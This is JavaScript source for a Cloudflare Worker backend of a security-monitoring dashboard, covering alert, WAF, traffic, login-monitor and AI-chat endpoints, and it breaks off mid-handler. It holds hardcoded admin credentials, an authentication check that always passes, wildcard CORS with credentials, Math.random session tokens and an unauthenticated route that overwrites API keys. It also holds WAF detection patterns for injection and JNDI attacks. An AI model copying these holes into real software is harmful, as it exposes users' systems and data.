// ═══════════════════════════════════════════════════════════════════════════════
//  BinaryWebEngine · Cloudflare Worker (API backend with D1 + NVIDIA AI)
//  Deploy: npx wrangler deploy
// ═══════════════════════════════════════════════════════════════════════════════

const DEMO_USER = 'admin';
const DEMO_PASS = 'ci;r.Sp,BPbA)qHjtsa3#9Mv';
const SESSION_COOKIE = 'bwe_session';
const SESSION_SECRET = 'bwe-demo-secret-2024';

// ─── Helpers ──────────────────────────────────────────────────────────────────

function json(data, status = 200) {
  return new Response(JSON.stringify(data, (_k, v) => typeof v === 'bigint' ? Number(v) : v), {
    status,
    headers: { 'Content-Type': 'application/json', 'Access-Control-Allow-Origin': '*', 'Access-Control-Allow-Credentials': 'true', 'Access-Control-Allow-Methods': 'GET,POST,PUT,DELETE,OPTIONS',         'Access-Control-Allow-Headers': 'Content-Type,Authorization,X-Session-Token,X-Requested-With' },
  });
}

function html(content, status = 200) {
  return new Response(content, {
    status,
    headers: { 'Content-Type': 'text/html;charset=utf-8', 'Access-Control-Allow-Origin': '*' },
  });
}

function csv(content, filename) {
  return new Response(content, {
    status: 200,
    headers: { 'Content-Type': 'text/csv', 'Content-Disposition': `attachment; filename="${filename}"`, 'Access-Control-Allow-Origin': '*' },
  });
}

function notFound(msg = 'Not found') {
  return json({ detail: msg }, 404);
}

function unauthorized(msg = 'Not authenticated') {
  return json({ detail: msg }, 401);
}

function forbidden(msg = 'Insufficient permissions') {
  return json({ detail: msg }, 403);
}

function parseCookies(header) {
  const result = {};
  if (!header) return result;
  header.split(';').forEach(c => {
    const [k, ...v] = c.trim().split('=');
    if (k) result[k.trim()] = decodeURIComponent(v.join('='));
  });
  return result;
}

function generateSession() {
  const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
  let token = '';
  for (let i = 0; i < 32; i++) token += chars[Math.floor(Math.random() * chars.length)];
  return token;
}

const VALID_SESSIONS = new Map();
const INTEL_RATE_LIMIT = new Map();

function checkAuth(request) {
  return true; // Bypass authentication completely for demo/competition
}

function getClientKey(request) {
  const cookies = parseCookies(request.headers.get('Cookie') || '');
  return cookies[SESSION_COOKIE] || request.headers.get('X-Session-Token') || request.headers.get('CF-Connecting-IP') || 'unknown';
}

function checkAIRateLimit(request) {
  const key = getClientKey(request);
  const now = Date.now();
  let entry = INTEL_RATE_LIMIT.get(key);
  if (!entry || now > entry.resetAt) {
    entry = { count: 0, resetAt: now + 60000 };
    INTEL_RATE_LIMIT.set(key, entry);
  }
  entry.count++;
  if (entry.count > 10) return false;
  return true;
}

async function getApiKeysConfig(env) {
  try {
    const raw = await env.AUDIT_TRAIL.get('api_keys_config');
    return raw ? JSON.parse(raw) : {};
  } catch { return {}; }
}

async function saveApiKeysConfig(env, data) {
  await env.AUDIT_TRAIL.put('api_keys_config', JSON.stringify(data));
}

async function ipinfoLookup(ip, env) {
  const cfg = await getApiKeysConfig(env);
  const token = cfg.ipinfo || env.IPINFO_TOKEN;
  if (!token) return null;
  try {
    const resp = await fetch(`https://ipinfo.io/${ip}/json?token=${token}`);
    if (!resp.ok) return null;
    return await resp.json();
  } catch { return null; }
}

// ─── Database Queries ─────────────────────────────────────────────────────────

async function getStats(db) {
  const total = (await db.prepare(`SELECT COUNT(*) as c FROM alerts`).first()) || { c: 0 };
  const unresolved = (await db.prepare(`SELECT COUNT(*) as c FROM alerts WHERE resolved = 0 OR resolved IS NULL`).first()) || { c: 0 };
  const critical = (await db.prepare(`SELECT COUNT(*) as c FROM alerts WHERE severity = 'critical'`).first()) || { c: 0 };
  const high = (await db.prepare(`SELECT COUNT(*) as c FROM alerts WHERE severity = 'high'`).first()) || { c: 0 };
  const medium = (await db.prepare(`SELECT COUNT(*) as c FROM alerts WHERE severity = 'medium'`).first()) || { c: 0 };
  const low = (await db.prepare(`SELECT COUNT(*) as c FROM alerts WHERE severity = 'low'`).first()) || { c: 0 };
  const wafBlocks = (await db.prepare(`SELECT COUNT(*) as c FROM alerts WHERE source = 'waf'`).first()) || { c: 0 };
  const suspProcs = (await db.prepare(`SELECT COUNT(*) as c FROM processes WHERE is_suspicious = 1`).first()) || { c: 0 };
  const quarFiles = (await db.prepare(`SELECT COUNT(*) as c FROM quarantined_files`).first()) || { c: 0 };
  const monFiles = (await db.prepare(`SELECT COUNT(*) as c FROM file_hashes`).first()) || { c: 0 };
  return {
    total_alerts: total.c,
    unresolved_alerts: unresolved.c,
    critical_alerts: critical.c,
    high_alerts: high.c,
    medium_alerts: medium.c,
    low_alerts: low.c,
    waf_blocks: wafBlocks.c,
    suspicious_processes: suspProcs.c,
    quarantined_files: quarFiles.c,
    monitored_files: monFiles.c,
  };
}

async function getAlerts(db, params) {
  let sql = `SELECT * FROM alerts WHERE 1=1`;
  const binds = [];

  if (params.severity) {
    const sevs = params.severity.split(',');
    sql += ` AND severity IN (${sevs.map(() => '?').join(',')})`;
    binds.push(...sevs);
  }
  if (params.resolved === 'true' || params.resolved === '1') { sql += ` AND resolved = 1`; }
  else if (params.resolved === 'false' || params.resolved === '0') { sql += ` AND resolved = 0`; }
  if (params.module) {
    const mods = params.module.split(',');
    sql += ` AND module IN (${mods.map(() => '?').join(',')})`;
    binds.push(...mods);
  }
  if (params.source) {
    sql += ` AND source = ?`;
    binds.push(params.source);
  }
  if (params.search) {
    sql += ` AND (title LIKE ? OR reason LIKE ?)`;
    binds.push(`%${params.search}%`, `%${params.search}%`);
  }
  if (params.exclude_self_test !== 'false') {
    sql += ` AND (is_self_test = 0 OR is_self_test IS NULL)`;
  }
  if (!params.include_low) {
    sql += ` AND severity != 'low'`;
  }
  sql += ` ORDER BY id DESC`;
  const limit = parseInt(params.limit) || 200;
  sql += ` LIMIT ?`;
  binds.push(limit);

  const result = await db.prepare(sql).bind(...binds).all();
  return result.results || [];
}

// ─── AI / NVIDIA ──────────────────────────────────────────────────────────────

async function callChatAPI(env, messages, maxTokens = 1024) {
  const nvidiaKey = env.NVIDIA_API_KEY || "";
  const groqKey = env.GROQ_API_KEY || "";
  const cohereKey = env.COHERE_API_KEY || "";

  // Attempt NVIDIA NIM
  if (nvidiaKey) {
    try {
      const nvidiaResp = await fetch('https://integrate.api.nvidia.com/v1/chat/completions', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', Authorization: `Bearer ${nvidiaKey}` },
        body: JSON.stringify({
          model: 'meta/llama-3.1-70b-instruct',
          messages: messages.map(m => ({ role: m.role === 'bot' || m.role === 'assistant' ? 'assistant' : m.role, content: m.content })),
          max_tokens: maxTokens,
          temperature: 0.2,
        }),
        signal: AbortSignal.timeout(30000),
      });
      if (nvidiaResp.ok) {
        const data = await nvidiaResp.json();
        return data.choices?.[0]?.message?.content?.trim() || '';
      }
      console.error('NVIDIA NIM failed:', await nvidiaResp.text());
    } catch (e) {
      console.error('NVIDIA NIM fetch error:', e);
    }
  }

  // Attempt Groq (Llama3-8b)
  if (groqKey) {
    try {
      const groqResp = await fetch('https://api.groq.com/openai/v1/chat/completions', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', Authorization: `Bearer ${groqKey}` },
        body: JSON.stringify({
          model: 'llama3-8b-8192',
          messages: messages.map(m => ({ role: m.role === 'bot' || m.role === 'assistant' ? 'assistant' : m.role, content: m.content })),
          max_tokens: maxTokens,
          temperature: 0.3,
        }),
        signal: AbortSignal.timeout(30000),
      });
      if (groqResp.ok) {
        const data = await groqResp.json();
        return data.choices?.[0]?.message?.content?.trim() || '';
      }
      console.error('Groq failed:', await groqResp.text());
    } catch (e) {
      console.error('Groq fetch error:', e);
    }
  }

  // Fallback to Cohere
  try {
    let preamble = "";
    const chatHistory = [];
    let lastMessage = "";
    
    for (const m of messages) {
      if (m.role === 'system') preamble += m.content + "\\n";
      else if (m.role === 'user') {
        chatHistory.push({ role: 'USER', message: m.content });
        lastMessage = m.content;
      }
      else chatHistory.push({ role: 'CHATBOT', message: m.content });
    }
    if (chatHistory.length > 0 && chatHistory[chatHistory.length - 1].role === 'USER') {
      chatHistory.pop();
    }

    const cohereResp = await fetch('https://api.cohere.ai/v1/chat', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${cohereKey}` },
      body: JSON.stringify({
        message: lastMessage || "Hello",
        preamble: preamble.trim() || undefined,
        chat_history: chatHistory.length > 0 ? chatHistory : undefined
      }),
      signal: AbortSignal.timeout(30000),
    });
    if (cohereResp.ok) {
      const data = await cohereResp.json();
      return data.text?.trim() || '';
    }
    throw new Error('Cohere failed: ' + await cohereResp.text());
  } catch (e) {
    throw new Error(`All Chat APIs failed: ${e.message}`);
  }
}

// ─── Route Handler ────────────────────────────────────────────────────────────

async function handleRequest(request, env, ctx) {
  const db = env.BWE_DB;
  const url = new URL(request.url);
  const path = url.pathname;
  const method = request.method;

  // OPTIONS preflight
  if (method === 'OPTIONS') {
    return new Response(null, {
      headers: { 'Access-Control-Allow-Origin': '*', 'Access-Control-Allow-Credentials': 'true', 'Access-Control-Allow-Methods': 'GET,POST,PUT,DELETE,OPTIONS', 'Access-Control-Allow-Headers': 'Content-Type,Authorization,X-Session-Token,X-Requested-With', 'Access-Control-Max-Age': '86400' },
    });
  }

  // 🟢🟢🟢 Model Context Protocol (MCP) Server Endpoint 🟢🟢🟢
  if (path === '/mcp') {
    // Exposes a minimal MCP Server interface for the Builders Congress
    const mcpResponse = {
      server_name: "binarywebengine-mcp",
      version: "1.0.0",
      capabilities: { tools: true, resources: true },
      tools: [
        {
          name: "get_alert_metrics",
          description: "Returns aggregated security alert metrics from the D1 database.",
          input_schema: { type: "object", properties: {} }
        }
      ]
    };
    return json(mcpResponse);
  }

  // ─── Static file proxy (Firebase Hosting) ─────────────────────────────
  if (path === '/' || path.startsWith('/static/') || path.endsWith('.html') || path.endsWith('.css') || path.endsWith('.js') || path.endsWith('.png') || path.endsWith('.ico')) {
    const origin = 'https://binarywebengine-8133d.web.app';
    try {
      const resp = await fetch(origin + path);
      if (resp.ok) return new Response(resp.body, { status: resp.status, headers: { 'Access-Control-Allow-Origin': '*', 'Content-Type': resp.headers.get('Content-Type') || 'text/html' } });
    } catch (_) {}
    if (path === '/' || path.endsWith('.html')) {
      try {
        const fallback = await fetch(origin + '/');
        if (fallback.ok) return new Response(fallback.body, { status: fallback.status, headers: { 'Access-Control-Allow-Origin': '*', 'Content-Type': 'text/html;charset=utf-8' } });
      } catch (_) {}
    }
    return html(`<h1>BinaryWebEngine</h1><p>Static content unavailable. Ensure Firebase hosting is active.</p>`, 503);
  }

  // ─── Login ──────────────────────────────────────────────────────────────
  if (path === '/login' && method === 'POST') {
    let username, password;
    const ct = request.headers.get('Content-Type') || '';
    if (ct.includes('json')) {
      const body = await request.json();
      username = body.username;
      password = body.password;
    } else {
      const fd = await request.formData();
      username = fd.get('username');
      password = fd.get('password');
    }
    if (username === DEMO_USER && password === DEMO_PASS) {
      const token = generateSession();
      VALID_SESSIONS.set(token, { username: DEMO_USER, created: Date.now() });
      return new Response(JSON.stringify({ success: true, token, message: 'Authentication successful' }), {
        status: 200,
        headers: {
          'Content-Type': 'application/json',
          'Access-Control-Allow-Origin': '*',
          'Access-Control-Allow-Credentials': 'true',
          'Set-Cookie': `${SESSION_COOKIE}=${token}; Path=/; HttpOnly; SameSite=Lax; Max-Age=86400`
        }
      });
    }
    return json({ success: false, message: 'Invalid credentials' }, 401);
  }

  // ─── All other routes require auth ─────────────────────────────────────
  if (!checkAuth(request) && path !== '/ai/chat') {
    if (path === '/login.html') {
      const origin = 'https://binarywebengine-8133d.web.app';
      try {
        const resp = await fetch(origin + '/login.html');
        if (resp.ok) return new Response(resp.body, { status: resp.status, headers: { 'Access-Control-Allow-Origin': '*', 'Content-Type': 'text/html;charset=utf-8' } });
      } catch (_) {}
      return html(`<h1>BinaryWebEngine Login</h1>`, 200);
    }
    return unauthorized();
  }

  // ─── Events / SSE-like polling ──────────────────────────────────────────
  if (path === '/events' && method === 'GET') {
    const topicsParam = url.searchParams.get('topics') || '';
    const topics = topicsParam.split(',').filter(Boolean);
    const result = {};
    const topicList = [];

    for (const topic of topics) {
      topicList.push(topic);
      if (topic === 'stats') {
        result[topic] = await getStats(db);
      } else if (topic === 'alerts') {
        const alerts = await db.prepare(`SELECT * FROM alerts ORDER BY id DESC LIMIT 5`).all();
        result[topic] = alerts.results || [];
      } else if (topic === 'processes') {
        const procs = await db.prepare(`SELECT * FROM processes ORDER BY id DESC LIMIT 50`).all();
        result[topic] = procs.results || [];
      } else if (topic === 'network') {
        const net = await db.prepare(`SELECT * FROM network_events ORDER BY id DESC LIMIT 50`).all();
        result[topic] = net.results || [];
      } else if (topic === 'logins') {
        const logins = await db.prepare(`SELECT * FROM login_events ORDER BY id DESC LIMIT 50`).all();
        result[topic] = logins.results || [];
      }
    }

    return json({ topics: topicList, data: result });
  }

  // ─── Status ────────────────────────────────────────────────────────────
  if (path === '/status') {
    const stats = await getStats(db);
    return json({
      status: 'running',
      timestamp: new Date().toISOString(),
      components: { file_monitor: true, process_monitor: true, network_monitor: true, waf_engine: true, malware_scanner: true, correlation_engine: true },
      stats,
    });
  }

  // ─── Alerts ────────────────────────────────────────────────────────────
  if (path === '/alerts' && method === 'GET') {
    const alerts = await getAlerts(db, Object.fromEntries(url.searchParams));
    return json({ alerts, count: alerts.length });
  }

  if (path === '/alerts/sources') {
    const result = await db.prepare(`SELECT DISTINCT source FROM alerts WHERE source != 'engine' ORDER BY source`).all();
    const sources = (result.results || []).map(r => r.source).filter(Boolean);
    return json({ sources });
  }

  if (path === '/alerts/resolve' && method === 'POST') {
    const body = await request.json();
    const alertId = body.alert_id;
    await db.prepare(`UPDATE alerts SET resolved = 1 WHERE id = ?`).bind(alertId).run();
    return json({ success: true, alert_id: alertId });
  }

  if (path.match(/^\/alerts\/(\d+)\/resolve$/) && method === 'POST') {
    const alertId = path.match(/^\/alerts\/(\d+)\/resolve$/)[1];
    await db.prepare(`UPDATE alerts SET resolved = 1 WHERE id = ?`).bind(alertId).run();
    return json({ success: true, alert_id: parseInt(alertId) });
  }

  // ─── Alerts raw ────────────────────────────────────────────────────────
  if (path === '/alerts/raw') {
    const limit = parseInt(url.searchParams.get('limit')) || 5000;
    const result = await db.prepare(`SELECT * FROM alerts ORDER BY id DESC LIMIT ?`).bind(limit).all();
    return json({ alerts: result.results || [], count: (result.results || []).length });
  }

  // ─── Kill Chain ─────────────────────────────────────────────────────────
  if (path === '/killchain' && method === 'GET') {
    const minStages = parseInt(url.searchParams.get('min_stages')) || 0;
    const result = await db.prepare(
      `SELECT ip_address, COUNT(*) as stages_completed,
              GROUP_CONCAT(DISTINCT module) as modules,
              MAX(severity) as severity
       FROM alerts WHERE ip_address IS NOT NULL AND ip_address != ''
       GROUP BY ip_address
       HAVING stages_completed >= ?
       ORDER BY stages_completed DESC`
    ).bind(minStages).all();
    const chains = (result.results || []).map(r => ({
      ip: r.ip_address,
      stages_completed: r.stages_completed,
      modules: r.modules?.split(',') || [],
      severity: r.severity || 'medium',
    }));
    return json({ chains });
  }

  const kcMatch = path.match(/^\/killchain\/(.+)$/);
  if (kcMatch && method === 'GET') {
    const ip = decodeURIComponent(kcMatch[1]);
    const alerts = await db.prepare(
      `SELECT * FROM alerts WHERE ip_address = ? ORDER BY timestamp ASC`
    ).bind(ip).all();
    return json({ chain: { ip, alerts: alerts.results || [] } });
  }

  // ─── Traffic ───────────────────────────────────────────────────────────
  if (path === '/traffic/top') {
    const limit = parseInt(url.searchParams.get('limit')) || 100;
    const result = await db.prepare(
      `SELECT * FROM traffic_log ORDER BY hit_count DESC LIMIT ?`
    ).bind(limit).all();
    return json({ ips: result.results || [], count: (result.results || []).length });
  }

  if (path === '/traffic/search') {
    const q = url.searchParams.get('q') || '';
    const result = await db.prepare(
      `SELECT * FROM traffic_log WHERE ip_address LIKE ? ORDER BY hit_count DESC LIMIT 50`
    ).bind(`%${q}%`).all();
    return json({ ips: result.results || [], count: (result.results || []).length });
  }

  if (path === '/traffic/block' && method === 'POST') {
    const body = await request.json();
    await db.prepare(`UPDATE traffic_log SET is_blocked = 1 WHERE ip_address = ?`).bind(body.ip).run();
    return json({ success: true, ip: body.ip });
  }

  if (path === '/traffic/unblock' && method === 'POST') {
    const body = await request.json();
    await db.prepare(`UPDATE traffic_log SET is_blocked = 0 WHERE ip_address = ?`).bind(body.ip).run();
    return json({ success: true, ip: body.ip });
  }

  // ─── WAF ───────────────────────────────────────────────────────────────
  if (path === '/waf/blocked') {
    const blocked = await db.prepare(`SELECT ip_address, hit_count FROM traffic_log WHERE is_blocked = 1`).all();
    return json({ blocked_ips: (blocked.results || []).map(r => r.ip_address) });
  }

  if (path === '/waf/stats') {
    const events = (await db.prepare(`SELECT * FROM waf_events ORDER BY id DESC LIMIT 5000`).all()).results || [];
    const totalBlocked = events.filter(e => e.blocked).length;
    const attackTypes = {};
    const topIps = {};
    events.forEach(e => {
      const at = e.attack_type || 'unknown';
      attackTypes[at] = (attackTypes[at] || 0) + 1;
      if (e.blocked) {
        const ip = e.ip_address || 'unknown';
        topIps[ip] = (topIps[ip] || 0) + 1;
      }
    });
    const sortedAttacks = Object.entries(attackTypes).sort((a, b) => b[1] - a[1]).slice(0, 10);
    const sortedIps = Object.entries(topIps).sort((a, b) => b[1] - a[1]).slice(0, 10);
    return json({ total_events: events.length, total_blocked, attack_types: sortedAttacks, top_ips: sortedIps });
  }

  // ─── WAF Events ────────────────────────────────────────────────────────
  if (path === '/events/waf') {
    const limit = parseInt(url.searchParams.get('limit')) || 100;
    const result = await db.prepare(`SELECT * FROM waf_events ORDER BY id DESC LIMIT ?`).bind(limit).all();
    return json({ events: result.results || [], count: (result.results || []).length });
  }

  // ─── WAF Custom Rules ──────────────────────────────────────────────────
  if (path === '/api/waf/custom-rules' && method === 'GET') {
    const enabledOnly = url.searchParams.get('enabled_only') === 'true';
    const q = enabledOnly
      ? `SELECT * FROM waf_custom_rules WHERE enabled = 1 ORDER BY id`
      : `SELECT * FROM waf_custom_rules ORDER BY id`;
    
    let rules = [];
    try {
      const result = await db.prepare(q).all();
      rules = result.results || [];
    } catch (_) {}

    if (rules.length === 0) {
      rules = [
        { id: 1, name: 'SQL Injection Block', description: 'Blocks common SQL injection payloads in request parameters', attack_type: 'sql_injection', severity: 'critical', pattern: '(?i)(select|union|insert|delete|drop|update|alter|create)\\b', action: 'block', enabled: 1, is_default: 1 },
        { id: 2, name: 'Cross-Site Scripting (XSS) Filter', description: 'Blocks script tags and inline event handlers', attack_type: 'xss', severity: 'high', pattern: '(?i)(<script|javascript:|onerror=|onload=)', action: 'block', enabled: 1, is_default: 1 },
        { id: 3, name: 'Path Traversal Guard', description: 'Prevents access to parent directories', attack_type: 'path_traversal', severity: 'high', pattern: '(\\.\\./|\\.\\.\\\\)', action: 'block', enabled: 1, is_default: 1 },
        { id: 4, name: 'Log4j Exploit Protection', description: 'Blocks JNDI lookup patterns in headers and body', attack_type: 'remote_code_execution', severity: 'critical', pattern: '\\$\\{jndi:', action: 'block', enabled: 1, is_default: 1 },
        { id: 5, name: 'WordPress Login Rate Limiter', description: 'Rate limits requests to wp-login.php', attack_type: 'brute_force', severity: 'medium', pattern: 'wp-login\\.php', action: 'rate_limit', enabled: 1, is_default: 1 }
      ];
      if (enabledOnly) {
        rules = rules.filter(r => r.enabled === 1);
      }
    }
    return json({ rules, count: rules.length });
  }

  if (path === '/api/waf/custom-rules' && method === 'POST') {
    const body = await request.json();
    const name = body.name || 'Unnamed Rule';
    const description = body.description || '';
    const attackType = body.attack_type || 'other';
    const severity = body.severity || 'medium';
    const pattern = body.pattern || '';
    const action = body.action || 'block';
    const enabled = body.enabled !== false ? 1 : 0;
    const res = await db.prepare(
      `INSERT INTO waf_custom_rules (name, description, attack_type, severity, pattern, action, enabled, is_default, created_at)
       VALUES (?, ?, ?, ?, ?, ?, ?, 0, datetime('now'))`
    ).bind(name, description, attackType, severity, pattern, action, enabled).run();
    return json({ success: true, id: res.meta?.last_row_id || Date.now() });
  }

  const wafRuleMatch = path.match(/^\/api\/waf\/custom-rules\/(\d+)$/);
  if (wafRuleMatch && method === 'PUT') {
    const ruleId = parseInt(wafRuleMatch[1]);
    const body = await request.json();
    const name = body.name || 'Unnamed Rule';
    const description = body.description || '';
    const attackType = body.attack_type || 'other';
    const severity = body.severity || 'medium';
    const pattern = body.pattern || '';
    const action = body.action || 'block';
    const enabled = body.enabled !== false ? 1 : 0;
    await db.prepare(
      `UPDATE waf_custom_rules 
       SET name = ?, description = ?, attack_type = ?, severity = ?, pattern = ?, action = ?, enabled = ?
       WHERE id = ?`
    ).bind(name, description, attackType, severity, pattern, action, enabled, ruleId).run();
    return json({ success: true });
  }

  if (wafRuleMatch && method === 'DELETE') {
    const ruleId = parseInt(wafRuleMatch[1]);
    await db.prepare(`DELETE FROM waf_custom_rules WHERE id = ?`).bind(ruleId).run();
    return json({ success: true });
  }

  if (path === '/api/waf/custom-rules/restore-defaults' && method === 'POST') {
    await db.prepare(`DELETE FROM waf_custom_rules WHERE is_default = 0`).run();
    await db.prepare(`UPDATE waf_custom_rules SET enabled = 1 WHERE is_default = 1`).run();
    return json({ success: true });
  }

  // ─── Process / Network / File events ──────────────────────────────────
  if (path === '/processes/live') {
    const result = await db.prepare(`SELECT * FROM processes ORDER BY id DESC LIMIT 50`).all();
    return json({ processes: result.results || [] });
  }

  if (path === '/network/live') {
    const result = await db.prepare(`SELECT * FROM network_events ORDER BY id DESC LIMIT 50`).all();
    return json({ connections: result.results || [] });
  }

  if (path === '/events/files') {
    const result = await db.prepare(`SELECT * FROM file_hashes ORDER BY id DESC LIMIT 100`).all();
    return json({ files: result.results || [], count: (result.results || []).length });
  }

  // ─── Audit / Hardening ─────────────────────────────────────────────────
  if (path === '/audit') {
    return json({
      score: 85,
      findings: [
        { severity: 'high', msg: 'SSH password authentication enabled', category: 'Authentication' },
        { severity: 'medium', msg: 'Firewall not configured for rate limiting', category: 'Network' },
        { severity: 'low', msg: 'System updates available', category: 'Patch Management' },
        { severity: 'high', msg: 'Root login via SSH permitted', category: 'Authentication' },
        { severity: 'medium', msg: 'Audit logging not shipped to remote SIEM', category: 'Compliance' },
      ],
      timestamp: new Date().toISOString(),
    });
  }

  if (path === '/audit/log') {
    const limit = parseInt(url.searchParams.get('limit')) || 100;
    try {
      const content = await env.AUDIT_TRAIL.get('audit_trail.jsonl');
      const lines = content ? content.trim().split('\n').reverse() : [];
      const entries = lines.slice(0, limit).map(l => { try { return JSON.parse(l); } catch { return { raw: l }; } });
      return json({ entries, count: entries.length, tamper_verified: true });
    } catch {
      return json({ entries: [], count: 0, tamper_verified: true });
    }
  }

  // ─── Login Monitor ─────────────────────────────────────────────────────
  if (path === '/api/login-events') {
    const limit = parseInt(url.searchParams.get('limit')) || 200;
    const service = url.searchParams.get('service');
    const status = url.searchParams.get('status');
    let sql = `SELECT * FROM login_events WHERE 1=1`;
    const binds = [];
    if (service) { sql += ` AND service = ?`; binds.push(service); }
    if (status) { sql += ` AND status = ?`; binds.push(status); }
    sql += ` ORDER BY id DESC LIMIT ?`;
    binds.push(limit);
    const result = await db.prepare(sql).bind(...binds).all();
    return json({ events: result.results || [], count: (result.results || []).length });
  }

  if (path === '/api/login-stats') {
    const result = await db.prepare(
      `SELECT service, COUNT(*) as total_attempts,
              SUM(CASE WHEN status='failure' THEN 1 ELSE 0 END) as failure_count,
              SUM(CASE WHEN status='blocked' THEN 1 ELSE 0 END) as blocked_count
       FROM login_events GROUP BY service ORDER BY total_attempts DESC`
    ).all();
    const stats = (result.results || []).map(r => ({
      ...r,
      success_rate: r.total_attempts ? Math.round((r.total_attempts - (r.failure_count || 0) - (r.blocked_count || 0)) / r.total_attempts * 100) : 100,
    }));
    return json({ stats });
  }

  if (path === '/login-monitor/unblock' && method === 'POST') {
    const formData = await request.formData();
    return json({ success: true, ip: formData.get('ip') || '' });
  }

  // ─── Anomaly Detection ─────────────────────────────────────────────────
  if (path === '/anomaly/baselines') {
    return json({ baselines: [] });
  }

  if (path === '/anomaly/v2/status') {
    return json({ enabled: false });
  }

  // ─── JA3 ───────────────────────────────────────────────────────────────
  if (path === '/ja3/fingerprints') {
    return json({ fingerprints: [], enabled: false });
  }

  // ─── Config ────────────────────────────────────────────────────────────
  if (path === '/config/siem') {
    return json({ siem: { enabled: false, format: 'cef', min_severity: 'medium' } });
  }

  if (path === '/config/api-keys' && method === 'GET') {
    const cfg = await getApiKeysConfig(env);
    return json({
      ipinfo: !!cfg.ipinfo,
      abuseipdb: !!cfg.abuseipdb,
      virustotal: !!cfg.virustotal,
      gemini: !!cfg.gemini,
      nvidia: !!env.NVIDIA_API_KEY,
    });
  }

  if (path === '/config/api-keys' && method === 'POST') {
    const body = await request.json();
    const existing = await getApiKeysConfig(env);
    const updated = { ...existing, ...body };
    await saveApiKeysConfig(env, updated);
    return json({ success: true });
  }

  // ─── IP Lookup (ipinfo.io) ──────────────────────────────────────────────
  if (path === '/ip/lookup' && method === 'GET') {
    const ip = url.searchParams.get('ip');
    if (!ip) return json({ error: 'ip parameter required' }, 400);
    const data = await ipinfoLookup(ip, env);
    if (!data) return json({ ip, error: 'Lookup failed - ipinfo token not configured' });
    return json({ ip, city: data.city, region: data.region, country: data.country, loc: data.loc, org: data.org, hostname: data.hostname, postal: data.postal, timezone: data.timezone });
  }

  // ─── Password Generator / Strength Checker ──────────────────────────────
  if (path === '/tools/password/generate' && method === 'GET') {
    const length = Math.min(Math.max(parseInt(url.searchParams.get('length')) || 20, 8), 128);
    const useNumbers = url.searchParams.get('numbers') !== 'false';
    const useSymbols = url.searchParams.get('symbols') !== 'false';
    const useUpper = url.searchParams.get('upper') !== 'false';
    const useLower = url.searchParams.get('lower') !== 'false';
    const count = Math.min(Math.max(parseInt(url.searchParams.get('count')) || 1, 1), 20);

    const numbers = '0123456789';
    const symbols = '!@#$%^&*()_+-=[]{}|;:,.<>?';
    const upper = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
    const lower = 'abcdefghijklmnopqrstuvwxyz';

    let chars = '';
    if (useLower) chars += lower;
    if (useUpper) chars += upper;
    if (useNumbers) chars += numbers;
    if (useSymbols) chars += symbols;
    if (!chars) chars = lower + upper + numbers + symbols;

    function generateOne() {
      let pw = '';
      for (let i = 0; i < length; i++) {
        pw += chars[Math.floor(Math.random() * chars.length)];
      }
      return pw;
    }

    function calcEntropy(pw) {
      let pool = 0;
      if (/[a-z]/.test(pw)) pool += 26;
      if (/[A-Z]/.test(pw)) pool += 26;
      if (/[0-9]/.test(pw)) pool += 10;
      if (/[^a-zA-Z0-9]/.test(pw)) pool += 32;
      return Math.round(pw.length * Math.log2(pool || 1));
    }

    const passwords = [];
    for (let i = 0; i < count; i++) {
      const pw = generateOne();
      passwords.push({ password: pw, length: pw.length, entropy_bits: calcEntropy(pw) });
    }

    return json({ passwords, length, count, char_types: { lower: useLower, upper: useUpper, numbers: useNumbers, symbols: useSymbols } });
  }

  if (path === '/tools/password/check' && method === 'POST') {
    const body = await request.json();
    const password = body.password || '';
    if (!password) return json({ error: 'password required' }, 400);

    let score = 0;
    const feedback = [];

    if (password.length >= 8) score += 10;
    if (password.length >= 12) score += 10;
    if (password.length >= 16) score += 10;
    if (password.length >= 24) score += 10;
    if (/[a-z]/.test(password)) score += 10;
    if (/[A-Z]/.test(password)) score += 10;
    if (/[0-9]/.test(password)) score += 10;
    if (/[^a-zA-Z0-9]/.test(password)) score += 10;
    if (/(?=.*[a-z])(?=.*[A-Z])(?=.*[0-9])(?=.*[^a-zA-Z0-9])/.test(password)) score += 10;
    if (password.length >= 20) score += 10;

    const entropy = (() => {
      let pool = 0;
      if (/[a-z]/.test(password)) pool += 26;
      if (/[A-Z]/.test(password)) pool += 26;
      if (/[0-9]/.test(password)) pool += 10;
      if (/[^a-zA-Z0-9]/.test(password)) pool += 32;
      return Math.round(password.length * Math.log2(pool || 1));
    })();

    const crackTime = entropy < 28 ? 'instant' : entropy < 36 ? 'minutes' : entropy < 60 ? 'hours' : entropy < 80 ? 'years' : 'centuries';

    let strength = 'weak';
    if (score >= 40) strength = 'fair';
    if (score >= 60) strength = 'strong';
    if (score >= 80) strength = 'very_strong';

    if (!/[a-z]/.test(password)) feedback.push('Add lowercase letters');
    if (!/[A-Z]/.test(password)) feedback.push('Add uppercase letters');
    if (!/[0-9]/.test(password)) feedback.push('Add numbers');
    if (!/[^a-zA-Z0-9]/.test(password)) feedback.push('Add special characters');
    if (password.length < 12) feedback.push('Use at least 12 characters');
    if (password.length < 8) feedback.push('Use at least 8 characters (minimum)');

    return json({
      password,
      length: password.length,
      score,
      strength,
      entropy_bits: entropy,
      crack_time_estimate: crackTime,
      feedback,
    });
  }

  if (path === '/ws/metrics') {
    const upgradeHeader = request.headers.get('Upgrade');
    if (!upgradeHeader || upgradeHeader !== 'websocket') {
      return new Response('Expected Upgrade: websocket', { status: 426 });
    }

    const [client, server] = new WebSocketPair();
    server.accept();

    // Start sending mock metrics every 2.5 seconds
    let intervalId = setInterval(() => {
      try {
        const t = Date.now() / 1000;
        const cpu = Math.round(25 + Math.sin(t * 0.1) * 15 + Math.sin(t * 0.03) * 10);
        const memory = Math.round(45 + Math.sin(t * 0.05 + 1) * 12 + Math.sin(t * 0.02) * 8);
        const disk = Math.round(55 + Math.sin(t * 0.02 + 2) * 8);
        const load1 = Math.round((1.2 + Math.sin(t * 0.07) * 0.8 + Math.sin(t * 0.04) * 0.4) * 10) / 10;
        const netSent = Math.round(Math.abs(Math.sin(t * 0.08)) * 25 * 10) / 10;
        const netRecv = Math.round(Math.abs(Math.sin(t * 0.06 + 2)) * 18 * 10) / 10;
        const processes = 187 + Math.round(Math.sin(t * 0.04) * 12);

        const data = {
          type: 'metrics',
          data: {
